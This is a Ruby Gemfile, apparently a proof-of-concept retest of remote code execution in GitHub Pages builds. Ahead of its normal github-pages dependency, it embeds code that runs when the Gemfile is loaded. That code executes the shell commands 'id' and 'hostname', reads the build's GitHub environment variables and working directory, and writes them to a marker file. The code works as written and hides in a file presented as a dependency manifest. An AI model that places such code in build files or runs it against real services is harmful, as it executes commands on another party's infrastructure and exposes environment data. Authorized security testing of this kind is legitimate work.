# Authorized bounded GitHub Pages build RCE retest.
marker = "GEMFILE_RETEST_20260919-71b8a49e"
proof = []
proof << "marker=#{marker}"
proof << "utc=#{Time.now.utc.strftime('%Y-%m-%dT%H:%M:%SZ')}"
proof << "id=#{%x(id).strip}"
proof << "hostname=#{%x(hostname).strip}"
proof << "ruby=#{RUBY_VERSION}"
proof << "pwd=#{Dir.pwd}"
proof << "GITHUB_ACTION_REPOSITORY=#{ENV.fetch('GITHUB_ACTION_REPOSITORY', '<unset>')}"
proof << "GITHUB_ACTION_REF=#{ENV.fetch('GITHUB_ACTION_REF', '<unset>')}"
proof << "GITHUB_REPOSITORY=#{ENV.fetch('GITHUB_REPOSITORY', '<unset>')}"
puts proof.join("\n")
File.write(File.join(__dir__, "gemfile-rce-retest-20260919-71b8a49e.txt"), proof.join("\n") + "\n")
source "https://rubygems.org"
gem "github-pages", "= 232"
